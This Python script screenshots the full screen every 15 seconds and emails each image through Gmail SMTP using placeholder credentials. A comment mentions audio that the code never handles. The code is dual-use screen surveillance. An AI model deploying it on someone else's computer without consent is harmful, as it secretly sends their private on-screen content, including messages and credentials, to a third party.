import pyscreenshot as ImageGrab
import schedule
from datetime import datetime
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

def take_screenshot_and_send_email():
    try:
        print("Taking screenshot...")

        now = datetime.now()
        timestamp = now.strftime("%Y-%m-%d %H_%M_%S")
        image_name = f"screenshot-{timestamp}.png"
        image_filepath = f"screenshots\\{image_name}"
        screenshot = ImageGrab.grab()
        screenshot.save(image_filepath)

        # Send the screenshot and audio via email
        sender_email = "sender_email"  
        sender_password = "sender_password" 
        recipient_email = "recipient_email"  
        subject = "Screenshot"

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject

        text = MIMEText("Here is the screenshot.")
        msg.attach(text)

        # Attach the screenshot
        image = MIMEImage(open(image_filepath, 'rb').read(), name=image_name)
        msg.attach(image)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()

        print("Email with screenshot!")
    except Exception as e:
        print("Error: Unable to take screenshot or send email.")
        print(e)

def run_screenshot_email_scheduler():
    schedule.every(15).seconds.do(take_screenshot_and_send_email)

    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == '__main__':
    run_screenshot_email_scheduler()
